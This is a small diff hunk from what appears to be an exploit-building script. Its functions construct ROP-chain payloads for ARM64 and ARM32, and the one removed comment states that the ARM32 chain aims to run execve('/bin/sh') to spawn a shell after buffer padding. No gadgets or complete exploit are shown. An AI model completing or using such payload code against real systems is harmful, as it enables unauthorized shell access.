@@ -76,7 +76,6 @@ def construct_payload_arm64(offset, gadgets, writable_addr):
     return payload
 
 def construct_payload_arm32(offset, gadgets, writable_addr):
-    # Build the ROP chain for ARM32 to execute execve("/bin/sh", NULL, NULL)
     payload = b"A" * offset  # Padding
 
     rop_chain = b""
